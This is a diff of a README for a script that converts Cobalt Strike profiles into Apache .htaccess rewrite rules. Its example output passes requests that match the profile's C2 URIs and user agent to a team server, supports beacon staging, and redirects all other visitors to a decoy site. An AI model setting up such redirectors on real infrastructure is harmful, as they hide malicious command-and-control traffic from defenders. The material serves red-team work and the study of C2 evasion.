@@ -1,16 +1,16 @@
 # Convert Cobalt Strike profiles to Apache mod_rewrite .htaccess files to support HTTP C2 Redirection
 
-This is a quick script that converts a Cobalt Strike profile to a base mod_rewrite .htaccess file to support HTTP redirection with Cobalt Strike
+This is a quick script that converts a Cobalt Strike profile to a functional mod_rewrite .htaccess file to support HTTP proxy redirection from Apache to a  CobaltStrike teamserver.
 
-You will most likely want to tune and test before use, but it does help get the script started.
-
-This was heavily based on the work by Jeff Dimmock @bluescreenofjeff
+You should test and tune the output as needed before depolying
 
 __Updates and Features__
 
- - Uses the Profile User-Agent and Endpoint URI to create rewrite rules
- - Support CobaltStrike 3.10 HTTP Stager
- - Template for Scripted Web Delivery support
+ - Rewrite Rules based on valid C2 URIs (HTTP GET, POST, and Stager) and specified User-Agent string. Result: Only requests to valid C2 URIs with a specified UA string will be proxied to the Team Server by default.
+ - Uses a custom Malleable C2 profile to build a .htaccess file with corresponding mod_rewrite rules
+ - Supports the most recent Cobalt Strike 3.10 profile features
+ - HTTP or HTTPS proxying to the Cobalt Strike Team Server
+ - HTTP 302 Redirection to a Legitimate Site for Non-Matching Requests
 
 ## Quick start
 
@@ -23,24 +23,40 @@ The havex.profile example is included for a quick test.
 
 ## Example
 
-    python csToModrewrite.py -i havex.profile -c http://TEAMSERVER -d http://GOHERE
-    
+    python cs2modrewrite.py -i havex.profile -c https://TEAMSERVER -d HTTPS://GOHERE
+    #### Save the following as .htaccess in the root web directory
+
+    ########################################
+    ## .htaccess START 
     RewriteEngine On
-    
-    # Scripted Web Delivery (Optional)
-    # Uncomment and adjust as needed
-    #RewriteCond %{REQUEST_URI} ^/imgs/logo1.png?$
+
+    ## (Optional)
+    ## Scripted Web Delivery 
+    ## Uncomment and adjust as needed
+    #RewriteCond %{REQUEST_URI} ^/css/style1.css?$
     #RewriteCond %{HTTP_USER_AGENT} ^$
-    #RewriteRule ^.*$ http://TEAMSERVER%{REQUEST_URI} [P]
-    #RewriteCond %{REQUEST_URI} ^/..../?$
-    
-    # C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs) 
-    RewriteCond %{REQUEST_URI} ^/(/include/template/isx.php|/wp06/wp-includes/po.php|/wp08/wp-includes/dtcla.php|/modules/mod_search.php|/blog/wp-includes/pomo/src.php|/includes/phpmailer/class.pop3.php|/api/516280565958|/api/516280565959)/?$
-    RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5\.0\ (Windows;\ U;\ MSIE\ 7\.0;\ Windows\ NT\ 5\.2)\ Java/1\.5\.0_08)?$
-    RewriteRule ^.*$ http://TEAMSERVER{REQUEST_URI} [P]
-    
-    # Redirect All other traffic here
-    RewriteRule ^.*$ http://GOHERE/? [L,R=302]
+    #RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
+
+    ## Default Beacon Staging Support (/1234)
+    RewriteCond %{REQUEST_URI} ^/..../?$
+    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+    RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
+
+    ## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
+    ## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
+    ## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
+    ## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
+    ## Profile URIs
+    RewriteCond %{REQUEST_URI} ^(/include/template/isx.php.*|/wp06/wp-includes/po.php.*|/wp08/wp-includes/dtcla.php.*|/modules/mod_search.php.*|/blog/wp-includes/pomo/src.php.*|/includes/phpmailer/class.pop3.php.*|/api/516280565958.*|/api/516280565959.*)$
+    ## Profile UserAgent
+    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+    RewriteRule ^.*$ "https://TEAMSERVER%{REQUEST_URI}" [P,L]
+
+    ## Redirect all other traffic here (Optional)
+    RewriteRule ^.*$ HTTPS://GOHERE/? [L,R=302]
+
+    ## .htaccess END
+    ########################################
 
 ----------------------------------------------
 ## Apache Rewrite Setup and Tips
